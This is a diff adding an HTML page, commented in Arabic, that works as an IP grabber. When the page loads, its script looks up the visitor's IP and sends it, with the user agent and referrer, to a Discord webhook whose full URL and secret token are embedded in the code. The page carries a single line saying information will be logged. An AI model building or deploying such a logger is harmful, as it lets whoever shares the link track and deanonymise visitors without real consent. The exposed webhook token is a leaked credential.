@@ -1,0 +1,54 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Visitor Info</title>
+</head>
+<body>
+  <h1>Welcome!</h1>
+  <p>Your IP and basic information will be logged.</p>
+
+  <script>
+    // عنوان الويب هوك الخاص بـ Discord
+    const discordWebhookUrl = "https://discord.com/api/webhooks/1315420160030412821/PM8Cic_rvPk811Jl1rGerqT_KjycvUvAv4wvMjppH0mD3xNEZtnF8MX4sVTt9b8_4bYP";
+
+    // وظيفة للحصول على IP باستخدام API خارجي
+    async function getVisitorInfo() {
+      try {
+        // الحصول على عنوان IP من خدمة عامة
+        const response = await fetch('https://api.ipify.org?format=json');
+        const data = await response.json();
+        const ip = data.ip;
+
+        // معلومات إضافية
+        const userAgent = navigator.userAgent;
+        const referer = document.referrer || 'N/A';
+
+        // إرسال البيانات إلى الويب هوك الخاص بـ Discord
+        await fetch(discordWebhookUrl, {
+          method: 'POST',
+          headers: {
+            'Content-Type': 'application/json',
+          },
+          body: JSON.stringify({
+            content: `🚨 **New Visitor Alert!** 🚨\nIP: ${ip}\nUser-Agent: ${userAgent}\nReferer: ${referer}`,
+          }),
+        });
+
+        // عرض المعلومات على الشاشة
+        document.body.innerHTML += `
+          <p>Your IP: ${ip}</p>
+          <p>User-Agent: ${userAgent}</p>
+          <p>Referer: ${referer}</p>
+        `;
+      } catch (error) {
+        console.error('Error fetching or sending visitor info:', error);
+      }
+    }
+
+    // استدعاء الوظيفة عند تحميل الصفحة
+    getVisitorInfo();
+  </script>
+</body>
+</html>
